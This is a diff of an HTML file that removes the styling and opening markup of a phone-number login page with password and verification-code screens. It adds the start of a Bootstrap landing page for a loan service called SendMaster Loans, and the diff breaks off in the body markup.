@@ -1,2074 +1,1375 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome Back - Login</title>
+    <title>SendMaster Loans | Transparent US Financial Options</title>
+    <!-- Bootstrap 5 CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    
     <style>
-        /* ──────────────────────────────────────────────────────────────
-               RESET & BASE (Mobile-first — works from 280px upward)
-               ────────────────────────────────────────────────────────────── */
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        :root {
+            --navy-primary: #0a192f;
+            --navy-secondary: #1e293b;
+            --green-accent: #10b981;
+            --green-hover: #059669;
+            --light-bg: #f8fafc;
+            --card-border: #e2e8f0;
+            --text-dark: #0f172a;
+            --text-muted: #64748b;
         }
-        
+
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background-color: #f8f8f8;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: var(--light-bg);
+            color: var(--text-dark);
+            display: flex;
+            flex-direction: column;
             min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 12px;
         }
-        
-        .container,
-        .code-container {
-            width: 100%;
-            max-width: 500px;
-            background-color: white;
-            border-radius: 16px;
-            padding: clamp(20px, 5vw, 40px) clamp(16px, 4vw, 30px);
-            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
-            transition: padding 0.2s ease;
-        }
-        
-        .code-container {
-            display: none;
-        }
-        
-        .code-container.active {
-            display: block;
-        }
-        
-        .header {
-            display: flex;
-            align-items: center;
-            margin-bottom: clamp(20px, 4vw, 32px);
-            gap: clamp(10px, 2vw, 16px);
-        }
-        
-        .back-btn {
-            background: none;
-            border: none;
-            font-size: clamp(22px, 5vw, 28px);
-            cursor: pointer;
-            color: #333;
-            padding: 0;
-            line-height: 1;
-            min-width: 36px;
-            min-height: 36px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        h1 {
-            font-size: clamp(24px, 6vw, 34px);
-            font-weight: 700;
-            color: #000;
-            line-height: 1.2;
-        }
-        
-        .phone-input-group {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-            position: relative;
-            flex-wrap: nowrap;
-        }
-        
-        .country-selector-trigger {
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            padding: clamp(10px, 2vw, 14px) clamp(10px, 1.5vw, 16px);
-            background-color: white;
-            cursor: pointer;
-            font-size: clamp(13px, 3vw, 15px);
-            min-width: 90px;
-            flex-shrink: 0;
-            display: flex;
-            align-items: center;
-            gap: clamp(4px, 1vw, 8px);
-            transition: border-color 0.2s;
-            user-select: none;
-            white-space: nowrap;
-        }
-        
-        .country-selector-trigger:hover {
-            border-color: #aaa;
-        }
-        
-        .country-selector-trigger .flag-emoji {
-            font-size: clamp(18px, 4vw, 24px);
-            line-height: 1;
-        }
-        
-        .country-selector-trigger .dial-code {
-            font-weight: 600;
-            color: #333;
-            font-size: clamp(13px, 2.5vw, 15px);
-        }
-        
-        .country-selector-trigger .arrow {
-            margin-left: 2px;
-            font-size: 9px;
-            color: #888;
-            transition: transform 0.2s;
-        }
-        
-        .country-selector-trigger.open .arrow {
-            transform: rotate(180deg);
-        }
-        
-        .phone-input {
-            flex: 1;
-            min-width: 0;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            padding: clamp(10px, 2vw, 14px) clamp(12px, 2.5vw, 16px);
-            font-size: clamp(14px, 3.2vw, 16px);
-            background-color: #f8f8f8;
-            outline: none;
-            transition: border-color 0.2s, background-color 0.2s;
-        }
-        
-        .phone-input:focus {
-            border-color: #0097a7;
-            background-color: #fff;
-        }
-        
-        .phone-input::placeholder {
-            color: #999;
-            font-size: clamp(13px, 2.8vw, 15px);
-        }
-        
-        .country-dropdown {
-            display: none;
-            position: absolute;
-            top: calc(100% + 4px);
-            left: 0;
-            width: min(320px, 90vw);
-            max-height: min(300px, 50vh);
-            overflow-y: auto;
-            background: white;
-            border: 1px solid #ddd;
-            border-radius: 10px;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
-            z-index: 100;
-            padding: 6px 0;
-        }
-        
-        .country-dropdown.open {
-            display: block;
-        }
-        
-        .country-dropdown .country-item {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            padding: clamp(10px, 2vw, 14px) clamp(12px, 2.5vw, 18px);
-            cursor: pointer;
-            font-size: clamp(13px, 2.8vw, 15px);
-            transition: background 0.15s;
-            -webkit-tap-highlight-color: transparent;
-        }
-        
-        .country-dropdown .country-item:hover {
-            background-color: #f0f7ff;
-        }
-        
-        .country-dropdown .country-item:active {
-            background-color: #e0eeff;
-        }
-        
-        .country-dropdown .country-item .flag-emoji {
-            font-size: clamp(18px, 4vw, 22px);
-            line-height: 1;
-            width: 28px;
-            text-align: center;
-            flex-shrink: 0;
-        }
-        
-        .country-dropdown .country-item .country-name {
-            flex: 1;
-            color: #222;
-            min-width: 0;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-        }
-        
-        .country-dropdown .country-item .dial-code {
-            color: #888;
-            font-weight: 500;
-            flex-shrink: 0;
-        }
-        
-        .country-dropdown .country-item.active {
-            background-color: #e6f2ff;
-            font-weight: 600;
-        }
-        
-        .biometrics-section {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: clamp(20px, 4vw, 30px);
-            padding: clamp(10px, 2vw, 16px) 0;
-            gap: 12px;
-        }
-        
-        .biometrics-label {
-            display: flex;
-            align-items: center;
-            gap: clamp(8px, 2vw, 14px);
-            font-size: clamp(13px, 2.8vw, 15px);
-            color: #333;
-            cursor: pointer;
-            -webkit-tap-highlight-color: transparent;
-        }
-        
-        .biometrics-icon {
-            width: clamp(20px, 4vw, 26px);
-            height: clamp(20px, 4vw, 26px);
-            flex-shrink: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .biometrics-icon svg {
-            width: 100%;
-            height: 100%;
-        }
-        
-        .toggle {
-            width: clamp(44px, 10vw, 52px);
-            height: clamp(24px, 5.5vw, 30px);
-            background-color: #4a9b7f;
-            border-radius: 999px;
-            position: relative;
-            cursor: pointer;
-            transition: background-color 0.3s;
-            flex-shrink: 0;
-            -webkit-tap-highlight-color: transparent;
-        }
-        
-        .toggle.off {
-            background-color: #ccc;
-        }
-        
-        .toggle-circle {
-            width: clamp(20px, 4.5vw, 26px);
-            height: clamp(20px, 4.5vw, 26px);
-            background-color: white;
-            border-radius: 50%;
-            position: absolute;
-            top: 2px;
-            left: 2px;
-            transition: left 0.3s;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
-        }
-        
-        .toggle.off .toggle-circle {
-            left: calc(100% - clamp(20px, 4.5vw, 26px) - 2px);
-        }
-        
-        .login-btn,
-        .modal-confirm-btn {
-            width: 100%;
-            background-color: #ffff00;
-            border: none;
-            border-radius: 999px;
-            padding: clamp(14px, 3vw, 18px) 16px;
-            font-size: clamp(15px, 3.2vw, 17px);
-            font-weight: 700;
-            color: #000;
-            cursor: pointer;
-            transition: background-color 0.3s, transform 0.1s;
-            -webkit-tap-highlight-color: transparent;
-            min-height: 48px;
-        }
-        
-        .login-btn:active,
-        .modal-confirm-btn:active {
-            transform: scale(0.98);
-        }
-        
-        .login-btn:hover,
-        .modal-confirm-btn:hover {
-            background-color: #e6e600;
-        }
-        
-        .login-btn:disabled,
-        .modal-confirm-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
-        
-        .login-btn {
-            margin-bottom: 20px;
-        }
-        
-        .divider {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 18px;
-            color: #999;
-            font-size: clamp(13px, 2.8vw, 14px);
-        }
-        
-        .divider::before,
-        .divider::after {
-            content: '';
-            flex: 1;
-            height: 1px;
-            background-color: #ddd;
-        }
-        
-        .social-buttons {
-            display: flex;
-            flex-direction: column;
-            gap: clamp(10px, 2vw, 14px);
-            margin-bottom: clamp(24px, 6vw, 40px);
-        }
-        
-        .social-btn {
-            border: 2px solid #333;
-            background-color: white;
-            border-radius: 999px;
-            padding: clamp(12px, 2.5vw, 16px) 16px;
-            font-size: clamp(14px, 3vw, 16px);
-            font-weight: 600;
-            color: #000;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: clamp(8px, 2vw, 12px);
-            transition: all 0.3s;
-            -webkit-tap-highlight-color: transparent;
-            min-height: 48px;
-        }
-        
-        .social-btn:active {
-            transform: scale(0.98);
-        }
-        
-        .social-btn:hover {
-            background-color: #f5f5f5;
-        }
-        
-        .social-icon {
-            width: clamp(18px, 4vw, 24px);
-            height: clamp(18px, 4vw, 24px);
-            flex-shrink: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .social-icon svg {
-            width: 100%;
-            height: 100%;
-        }
-        
-        .footer {
-            text-align: center;
-            font-size: clamp(13px, 2.8vw, 14px);
-        }
-        
-        .footer-link {
-            color: #0891b2;
-            text-decoration: none;
-            cursor: pointer;
-            font-weight: 500;
-            -webkit-tap-highlight-color: transparent;
-        }
-        
-        .footer-link:hover {
-            text-decoration: underline;
-        }
-        
-        .footer-text {
-            margin-bottom: 8px;
-            color: #666;
-        }
-        
-        .signup-text {
-            color: #666;
-        }
-        
-        .modal-overlay {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background-color: rgba(0, 0, 0, 0.5);
-            z-index: 1000;
-            align-items: center;
-            justify-content: center;
-            padding: 16px;
-        }
-        
-        .modal-overlay.active {
-            display: flex;
-        }
-        
-        .modal {
-            background-color: white;
-            border-radius: 20px;
-            padding: clamp(24px, 5vw, 40px) clamp(20px, 4vw, 30px);
-            width: 100%;
-            max-width: 450px;
-            max-height: 90vh;
-            overflow-y: auto;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
-            position: relative;
-            animation: slideUp 0.3s ease-out;
-        }
-        
-        @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
-        .modal-close {
-            position: absolute;
-            top: clamp(12px, 2.5vw, 20px);
-            right: clamp(12px, 2.5vw, 20px);
-            background: none;
-            border: none;
-            font-size: 28px;
-            color: #333;
-            cursor: pointer;
-            padding: 4px;
-            width: 36px;
-            height: 36px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 50%;
-            transition: background 0.2s;
-        }
-        
-        .modal-close:hover {
-            background: #f0f0f0;
-        }
-        
-        .modal-icon {
-            width: clamp(48px, 12vw, 64px);
-            height: clamp(48px, 12vw, 64px);
-            background-color: #e0f2f1;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto clamp(16px, 3vw, 24px);
-        }
-        
-        .modal-icon svg {
-            width: clamp(28px, 6vw, 36px);
-            height: clamp(28px, 6vw, 36px);
-            color: #0097a7;
-        }
-        
-        .modal-title {
-            font-size: clamp(20px, 5vw, 26px);
-            font-weight: 700;
-            color: #000;
-            text-align: center;
-            margin-bottom: 10px;
-            line-height: 1.2;
-        }
-        
-        .modal-text {
-            font-size: clamp(13px, 2.8vw, 14px);
-            color: #666;
-            text-align: center;
-            margin-bottom: clamp(20px, 4vw, 28px);
-            line-height: 1.5;
-        }
-        
-        .password-input-wrapper {
-            position: relative;
-            margin-bottom: 14px;
-        }
-        
-        .password-input {
-            width: 100%;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            padding: clamp(12px, 2.5vw, 14px) clamp(40px, 8vw, 44px) clamp(12px, 2.5vw, 14px) clamp(14px, 3vw, 18px);
-            font-size: clamp(14px, 3vw, 16px);
-            background-color: #f8f8f8;
-            outline: none;
-            transition: border-color 0.2s, background-color 0.2s;
-        }
-        
-        .password-input:focus {
-            border-color: #0097a7;
-            background-color: #fff;
-        }
-        
-        .password-toggle {
-            position: absolute;
-            right: clamp(10px, 2vw, 14px);
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            cursor: pointer;
-            color: #999;
-            font-size: clamp(18px, 4vw, 22px);
-            padding: 4px;
-            line-height: 1;
-        }
-        
-        .forgot-password {
-            display: block;
-            text-align: left;
-            color: #0097a7;
-            text-decoration: none;
-            font-size: clamp(13px, 2.8vw, 14px);
-            margin-bottom: clamp(18px, 3.5vw, 24px);
-            font-weight: 500;
-        }
-        
-        .forgot-password:hover {
-            text-decoration: underline;
-        }
-        
-        .code-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 20px;
-            position: relative;
-        }
-        
-        .code-close-btn {
-            position: absolute;
-            top: 0;
-            left: 0;
-            background: none;
-            border: none;
-            font-size: clamp(24px, 5vw, 30px);
-            cursor: pointer;
-            color: #333;
-            padding: 0;
-            width: 36px;
-            height: 36px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .code-icon {
-            width: clamp(50px, 12vw, 64px);
-            height: clamp(60px, 14vw, 80px);
-            margin: 0 auto 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .code-icon svg {
-            width: clamp(32px, 7vw, 42px);
-            height: clamp(44px, 10vw, 60px);
-            stroke: #333;
-        }
-        
-        .code-title {
-            font-size: clamp(22px, 6vw, 30px);
-            font-weight: 700;
-            color: #000;
-            margin-bottom: 8px;
-            text-align: center;
-            line-height: 1.2;
-        }
-        
-        .code-description {
-            font-size: clamp(13px, 2.8vw, 14px);
-            color: #666;
-            text-align: center;
-            margin-bottom: clamp(20px, 4vw, 30px);
-            line-height: 1.4;
-            word-break: break-word;
-        }
-        
-        .code-inputs {
-            display: flex;
-            gap: clamp(8px, 2vw, 14px);
-            margin-bottom: clamp(20px, 4vw, 30px);
-            justify-content: center;
-            flex-wrap: wrap;
-        }
-        
-        .code-input {
-            width: clamp(40px, 10vw, 54px);
-            height: clamp(42px, 10vw, 56px);
-            border: 2px solid #ddd;
-            border-radius: 8px;
-            font-size: clamp(18px, 4.5vw, 24px);
-            font-weight: 600;
-            text-align: center;
-            outline: none;
-            transition: border-color 0.3s;
-            -webkit-appearance: none;
-            appearance: none;
-        }
-        
-        .code-input:focus {
-            border-color: #0097a7;
-        }
-        
-        .resend-section {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        
-        .resend-text {
-            font-size: clamp(12px, 2.6vw, 14px);
-            color: #666;
-            margin-bottom: 14px;
-        }
-        
-        .resend-timer {
-            font-weight: 500;
-        }
-        
-        .resend-buttons {
-            display: flex;
-            gap: clamp(10px, 2.5vw, 16px);
-            justify-content: center;
-            flex-wrap: wrap;
-        }
-        
-        .resend-btn {
-            border: 2px solid #999;
-            background-color: white;
-            border-radius: 999px;
-            padding: clamp(8px, 2vw, 12px) clamp(16px, 3.5vw, 24px);
-            font-size: clamp(13px, 2.8vw, 14px);
-            color: #333;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: clamp(6px, 1.5vw, 10px);
-            transition: all 0.3s;
-            -webkit-tap-highlight-color: transparent;
-            min-height: 44px;
-        }
-        
-        .resend-btn:hover:not(:disabled) {
-            border-color: #333;
-            background-color: #f5f5f5;
-        }
-        
-        .resend-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-        
-        .resend-btn:active:not(:disabled) {
-            transform: scale(0.97);
-        }
-        
-        .resend-btn svg {
-            width: clamp(16px, 3.5vw, 20px);
-            height: clamp(16px, 3.5vw, 20px);
-            flex-shrink: 0;
-        }
-        
-        .change-number {
-            text-align: center;
-            font-size: clamp(13px, 2.8vw, 14px);
-            color: #666;
-            margin-top: clamp(24px, 5vw, 36px);
-            padding-top: clamp(16px, 3vw, 20px);
-            border-top: 1px solid #eee;
-        }
-        
-        .change-number-link {
-            color: #0097a7;
-            text-decoration: none;
-            font-weight: 500;
-            cursor: pointer;
-            -webkit-tap-highlight-color: transparent;
-        }
-        
-        .change-number-link:hover {
-            text-decoration: underline;
-        }
-        
-        .country-dropdown::-webkit-scrollbar {
-            width: 6px;
-        }
-        
-        .country-dropdown::-webkit-scrollbar-track {
+
+        /* Mode Switcher / File Exporter Toolbar top bar */
+        .workspace-bar {
+            background-color: #0f172a;
+            color: #94a3b8;
+            padding: 8px 16px;
+            font-size: 0.85rem;
+            border-bottom: 1px solid #1e293b;
+        }
+
+        .workspace-tab {
             background: transparent;
+            border: 1px solid #334155;
+            color: #cbd5e1;
+            padding: 4px 12px;
+            border-radius: 6px;
+            margin-right: 6px;
+            cursor: pointer;
+            transition: all 0.2s;
         }
-        
-        .country-dropdown::-webkit-scrollbar-thumb {
-            background: #ccc;
-            border-radius: 3px;
+
+        .workspace-tab.active {
+            background-color: var(--green-accent);
+            border-color: var(--green-accent);
+            color: #ffffff;
+            font-weight: 600;
         }
-        
-        .country-dropdown::-webkit-scrollbar-thumb:hover {
-            background: #aaa;
+
+        /* Navbar Styling */
+        .navbar-brand {
+            font-weight: 800;
+            font-size: 1.5rem;
+            color: var(--navy-primary) !important;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
-        
-        @media (min-width: 600px) {
-            body {
-                padding: 24px;
-            }
-            .container,
-            .code-container {
-                border-radius: 20px;
-                padding: 36px 32px;
-            }
-            .phone-input-group {
-                gap: 12px;
-            }
-            .country-selector-trigger {
-                min-width: 110px;
-            }
-            .country-dropdown {
-                width: 340px;
-            }
-            .code-inputs {
-                gap: 14px;
-            }
-            .modal {
-                padding: 40px 32px;
-            }
-        }
-        
-        @media (min-width: 768px) {
-            body {
-                padding: 32px;
-                background-color: #f0f0f0;
-            }
-            .container,
-            .code-container {
-                box-shadow: 0 4px 24px rgba(0, 0, 0, 0.1);
-            }
-            .social-buttons {
-                flex-direction: column;
-            }
-        }
-        
-        @media (min-width: 1024px) {
-            body {
-                padding: 40px;
-                background-color: #eaeaea;
-            }
-            .container,
-            .code-container {
-                padding: 40px 36px;
-            }
-            .login-btn,
-            .modal-confirm-btn {
-                font-size: 16px;
-                padding: 16px;
-            }
-        }
-        
-        @media (min-width: 1400px) {
-            .container,
-            .code-container {
-                max-width: 520px;
-                padding: 48px 40px;
-            }
-        }
-        
-        @media (max-height: 500px) and (orientation: landscape) {
-            body {
-                padding: 8px 16px;
-                align-items: flex-start;
-            }
-            .container,
-            .code-container {
-                padding: 16px 20px;
-                border-radius: 12px;
-                margin: 4px auto;
-            }
-            .header {
-                margin-bottom: 12px;
-            }
-            h1 {
-                font-size: clamp(18px, 4vw, 24px);
-            }
-            .biometrics-section {
-                margin-bottom: 12px;
-                padding: 8px 0;
-            }
-            .login-btn {
-                margin-bottom: 12px;
-                padding: 10px;
-                min-height: 40px;
-            }
-            .social-buttons {
-                margin-bottom: 16px;
-                gap: 8px;
-            }
-            .social-btn {
-                padding: 8px 14px;
-                min-height: 38px;
-                font-size: clamp(12px, 2.5vw, 14px);
-            }
-            .phone-input-group {
-                margin-bottom: 12px;
-            }
-            .code-inputs {
-                margin-bottom: 16px;
-            }
-            .modal {
-                padding: 20px;
-                max-height: 85vh;
-            }
-            .modal-icon {
-                margin-bottom: 12px;
-            }
-        }
-        
-        @media (max-width: 360px) {
-            body {
-                padding: 8px;
-            }
-            .container,
-            .code-container {
-                padding: 16px 12px;
-                border-radius: 12px;
-            }
-            .country-selector-trigger {
-                min-width: 72px;
-                padding: 8px 6px;
-                font-size: 12px;
-            }
-            .country-selector-trigger .flag-emoji {
-                font-size: 16px;
-            }
-            .country-selector-trigger .dial-code {
-                font-size: 11px;
-            }
-            .country-dropdown {
-                width: calc(100vw - 24px);
-                min-width: 220px;
-            }
-            .code-inputs {
-                gap: 6px;
-            }
-            .code-input {
-                width: 36px;
-                height: 38px;
-                font-size: 16px;
-            }
-            .resend-buttons {
-                flex-direction: column;
-                align-items: center;
-            }
-        }
-        
-        @media (pointer: coarse) {
-            .back-btn,
-            .country-selector-trigger,
-            .biometrics-label,
-            .toggle,
-            .social-btn,
-            .login-btn,
-            .modal-confirm-btn,
-            .resend-btn,
-            .code-close-btn,
-            .modal-close,
-            .password-toggle,
-            .footer-link,
-            .change-number-link,
-            .forgot-password,
-            .country-item {
-                -webkit-tap-highlight-color: transparent;
-                touch-action: manipulation;
-            }
-            .code-input {
-                font-size: 20px;
-            }
-            .country-item:active {
-                background-color: #dceeff;
-            }
-        }
-        
-        @media (prefers-color-scheme: dark) {
-            body {
-                background-color: #1a1a2e;
-            }
-            .container,
-            .code-container,
-            .modal,
-            .country-dropdown {
-                background-color: #16213e;
-                box-shadow: 0 2px 12px rgba(0, 0, 0, 0.4);
-            }
-            h1,
-            .code-title,
-            .modal-title {
-                color: #e0e0e0;
-            }
-            .country-selector-trigger,
-            .phone-input,
-            .password-input,
-            .code-input,
-            .social-btn {
-                background-color: #1a1a2e;
-                border-color: #333;
-                color: #e0e0e0;
-            }
-            .country-selector-trigger .dial-code {
-                color: #ccc;
-            }
-            .phone-input::placeholder,
-            .password-input::placeholder {
-                color: #666;
-            }
-            .biometrics-label,
-            .footer-text,
-            .signup-text,
-            .modal-text,
-            .code-description,
-            .resend-text,
-            .change-number,
-            .divider {
-                color: #aaa;
-            }
-            .social-btn {
-                border-color: #555;
-                color: #e0e0e0;
-            }
-            .social-btn:hover {
-                background-color: #222;
-            }
-            .country-dropdown .country-item:hover {
-                background-color: #1e2a4a;
-            }
-            .country-dropdown .country-item.active {
-                background-color: #1e3a5f;
-                color: #fff;
-            }
-            .country-dropdown .country-item .country-name {
-                color: #ddd;
-            }
-            .modal-icon {
-                background-color: #1a3a3f;
-            }
-            .modal-icon svg {
-                color: #4dd0e1;
-            }
-            .back-btn,
-            .code-close-btn,
-            .modal-close {
-                color: #ccc;
-            }
-            .change-number {
-                border-top-color: #333;
-            }
-            .toggle.off {
-                background-color: #444;
-            }
-            .code-input.active,
-            .code-input:focus,
-            .phone-input:focus,
-            .password-input:focus {
-                border-color: #4dd0e1;
-                background-color: #1a1a2e;
-            }
-            .country-selector-trigger:hover {
-                border-color: #666;
-            }
-            .divider::before,
-            .divider::after {
-                background-color: #333;
-            }
-        }
-        /* ─── Loading spinner overlay ─── */
-        
-        .loading-overlay {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(255, 255, 255, 0.7);
-            z-index: 2000;
+
+        .brand-icon {
+            background: linear-gradient(135deg, var(--navy-primary), var(--green-accent));
+            color: white;
+            width: 38px;
+            height: 38px;
+            border-radius: 10px;
+            display: inline-flex;
             align-items: center;
             justify-content: center;
-            flex-direction: column;
-            gap: 16px;
+            font-weight: 800;
         }
-        
-        .loading-overlay.active {
-            display: flex;
-        }
-        
-        .loading-spinner {
-            width: 40px;
-            height: 40px;
-            border: 4px solid #ddd;
-            border-top-color: #0097a7;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-        
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-        
-        .loading-text {
-            font-size: 16px;
-            color: #333;
+
+        .nav-link {
             font-weight: 500;
+            color: var(--navy-secondary);
+            padding: 0.5rem 1rem !important;
+            transition: color 0.2s;
         }
-        
-        @media (prefers-color-scheme: dark) {
-            .loading-overlay {
-                background: rgba(0, 0, 0, 0.7);
-            }
-            .loading-text {
-                color: #ddd;
-            }
+
+        .nav-link:hover, .nav-link.active {
+            color: var(--green-accent);
         }
-        /* ─── Error message on modal ─── */
-        
-        .modal-error {
-            display: none;
-            background: #ffebee;
-            color: #c62828;
-            font-size: 13px;
-            padding: 10px 14px;
+
+        /* Custom Button Styling */
+        .btn-green {
+            background-color: var(--green-accent);
+            color: white;
+            font-weight: 600;
             border-radius: 8px;
-            margin-bottom: 14px;
-            text-align: center;
+            padding: 0.625rem 1.5rem;
+            border: none;
+            transition: all 0.2s ease-in-out;
+            box-shadow: 0 4px 6px -1px rgba(16, 185, 129, 0.2);
         }
-        
-        .modal-error.active {
+
+        .btn-green:hover {
+            background-color: var(--green-hover);
+            color: white;
+            transform: translateY(-1px);
+            box-shadow: 0 6px 12px -2px rgba(16, 185, 129, 0.3);
+        }
+
+        .btn-navy {
+            background-color: var(--navy-primary);
+            color: white;
+            font-weight: 600;
+            border-radius: 8px;
+            padding: 0.625rem 1.5rem;
+            border: none;
+            transition: all 0.2s;
+        }
+
+        .btn-navy:hover {
+            background-color: var(--navy-secondary);
+            color: white;
+        }
+
+        /* Standardized Proceed Button */
+        .proceed-btn {
+            background-color: var(--navy-primary) !important;
+            border-color: var(--navy-primary) !important;
+            border-radius: 8px !important;
+            padding: 0.75rem 2rem !important;
+            font-weight: 600 !important;
+            font-size: 1.1rem !important;
+            transition: all 0.2s ease-in-out !important;
+            box-shadow: 0 4px 10px rgba(10, 25, 47, 0.2) !important;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .proceed-btn:hover {
+            background-color: var(--green-accent) !important;
+            border-color: var(--green-accent) !important;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(16, 185, 129, 0.3) !important;
+        }
+
+        /* Hero Section */
+        .hero-section {
+            background: linear-gradient(135deg, var(--navy-primary) 0%, #1e293b 100%);
+            color: white;
+            padding: 4rem 0 5rem 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero-section::after {
+            content: '';
+            position: absolute;
+            bottom: -50px;
+            right: -50px;
+            width: 300px;
+            height: 300px;
+            border-radius: 50%;
+            background: rgba(16, 185, 129, 0.08);
+            pointer-events: none;
+        }
+
+        /* Cards & Components */
+        .custom-card {
+            background: white;
+            border-radius: 12px;
+            border: 1px solid var(--card-border);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.03);
+            transition: all 0.3s ease;
+        }
+
+        .custom-card:hover {
+            box-shadow: 0 10px 25px rgba(0,0,0,0.06);
+            transform: translateY(-2px);
+        }
+
+        .feature-icon {
+            width: 50px;
+            height: 50px;
+            border-radius: 10px;
+            background-color: rgba(16, 185, 129, 0.1);
+            color: var(--green-accent);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.25rem;
+            margin-bottom: 1.25rem;
+        }
+
+        .step-badge {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background-color: var(--navy-primary);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            margin-bottom: 1rem;
+        }
+
+        .disclosure-box {
+            background-color: #f1f5f9;
+            border-left: 4px solid var(--navy-primary);
+            padding: 1rem;
+            border-radius: 0 8px 8px 0;
+            font-size: 0.9rem;
+            color: #475569;
+        }
+
+        .calculator-box {
+            background: #ffffff;
+            border-radius: 16px;
+            padding: 2rem;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+            border: 1px solid var(--card-border);
+            color: var(--text-dark);
+        }
+
+        /* Form Inputs */
+        .form-control, .form-select {
+            border-radius: 8px;
+            padding: 0.75rem 1rem;
+            border: 1px solid #cbd5e1;
+        }
+
+        .form-control:focus, .form-select:focus {
+            border-color: var(--green-accent);
+            box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.2);
+        }
+
+        /* Footer */
+        footer {
+            background-color: var(--navy-primary);
+            color: #94a3b8;
+            margin-top: auto;
+        }
+
+        footer a {
+            color: #cbd5e1;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        footer a:hover {
+            color: var(--green-accent);
+        }
+
+        /* Code Viewer Formatting */
+        .code-container {
+            background-color: #0f172a;
+            color: #e2e8f0;
+            border-radius: 8px;
+            padding: 1.25rem;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.875rem;
+            max-height: 550px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+        }
+
+        /* Page Display Controller */
+        .page-view {
+            display: none;
+        }
+
+        .page-view.active-page {
             display: block;
-        }
-        
-        @media (prefers-color-scheme: dark) {
-            .modal-error {
-                background: #2a1515;
-                color: #ef9a9a;
-            }
         }
     </style>
 </head>
-
 <body>
 
-    <!-- Loading overlay -->
-    <div class="loading-overlay" id="loadingOverlay">
-        <div class="loading-spinner"></div>
-        <div class="loading-text" id="loadingText">Verifying...</div>
-    </div>
-
-    <!-- ════════════════ MAIN LOGIN PAGE ════════════════ -->
-    <div class="container" id="mainContainer">
-
-        <!-- Header -->
-        <div class="header">
-            <button class="back-btn" onclick="goBack()" aria-label="Go back">←</button>
-            <h1>Welcome back</h1>
+    <!-- TOP SYSTEM TOOLBAR (Simulates standalone site vs file viewer) -->
+    <div class="workspace-bar d-flex justify-content-between align-items-center flex-wrap gap-2">
+        <div class="d-flex align-items-center flex-wrap gap-1">
+            <span class="me-2 fw-bold text-white"><i class="fa-solid fa-layer-group me-1 text-success"></i> SendMaster Portal:</span>
+            <button class="workspace-tab active" onclick="switchMode('preview')"><i class="fa-solid fa-laptop me-1"></i> Interactive Live App</button>
+            <button class="workspace-tab" onclick="switchMode('files')"><i class="fa-solid fa-code me-1"></i> View Project Source Code</button>
         </div>
-
-        <!-- Phone Input -->
-        <div class="phone-input-group" id="phoneGroup">
-            <div class="country-selector-trigger" id="countryTrigger" onclick="toggleCountryDropdown()" role="combobox" aria-haspopup="listbox" aria-expanded="false" aria-label="Select country">
